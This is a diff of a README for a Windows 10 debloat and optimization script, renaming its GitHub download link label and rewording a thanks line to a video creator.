@@ -17,7 +17,7 @@ For example scheduled task script is enabled because i use scheduled task for ru
 Debloat and Optimization Script for machines running Windows 10 for all task purposes
 
 ## Download package
-[DNXDO_mining_Script.zip](https://github.com/nachazo78/Nachazo_OLD_machine_Script_from_DNXDOScript/raw/main/Nachazo_OLD_machine_Script_from_DNXDOScript-main.zip)
+[Nachazo_OLD_machine_Script_from_DNXDOScript.zp](https://github.com/nachazo78/Nachazo_OLD_machine_Script_from_DNXDOScript/raw/main/Nachazo_OLD_machine_Script_from_DNXDOScript-main.zip)
 
 ## Purpose
 This Script help to gain performance on your system, in two main ways:
@@ -94,8 +94,8 @@ Note: On some windows subscripts may appear some errors/red text/etc. Don't worr
 Now, before running all the scripts, there is an option to create a restore point of the system
 The script will enable the service for creating and managing restore points, and then will create a restorepoint with the default settings.
 
-Thanks to TuberViejuner for this suggestion.
-
 Hope you found useful this script.
 
 Nachazo78
+
+Thanks for tuberviejuner to do a Video about deen0x script. 
